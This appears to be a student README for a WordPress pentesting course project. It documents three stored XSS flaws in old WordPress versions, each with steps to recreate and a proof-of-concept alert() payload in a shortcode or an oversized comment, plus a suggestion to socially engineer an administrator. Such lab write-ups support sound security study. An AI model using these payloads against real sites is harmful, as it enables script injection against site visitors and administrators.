# Project 7 - WordPress Pentesting

Time spent: **3** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. WordPress <= 4.2.2 - Authenticated Stored Cross-Site Scripting (XSS) (ID: 8111)
  - [x] Summary: 
    - Vulnerability types: XSS
    - Tested in version: <= 4.2.2
    - Fixed in version: 4.2.3
  - [x] GIF Walkthrough: ![](./8111.gif)
  - [x] Steps to recreate: 
    - "Social engineer" the administrator to give you posting privileges (Author/Contributor role)
    - Exploit WordPress HTML processing by XSSing inside a post with the following code excerpt:
        ```html
        <a href="[caption code=">]</a><a title=" onmouseover=alert('hacked!!!')  ">link</a>
        ```
2. WordPress 4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds (ID: 8768)
  - [x] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.0-4.7.2
    - Fixed in version: 4.7.3
  - [x] GIF Walkthrough: ![](./8768.gif)
  - [x] Steps to recreate: 
    - "Social engineer" the administrator to give you posting privileges (Author/Contributor role)
    - Exploit WordPress vulnerability to sneak XSS code into YouTube embed shortcode
        ```
        [embed src='https://youtube.com/embed/12345\x3csvg onload=alert(12345)\x3e'][/embed]
        ```
3. WordPress <= 4.2 - Unauthenticated Stored Cross-Site Scripting (XSS) (ID: 7945)
  - [x] Summary: 
    - Vulnerability types: XSS
    - Tested in version: <= 4.2
    - Fixed in version: 4.2.1
  - [x] GIF Walkthrough: ![](./7945.gif)
  - [x] Steps to recreate: 
    - Comment an XSS code excerpt that exceeds 64kb
    ```javascript
    <a title='x onmouseover=alert(12345) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
    ```

## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
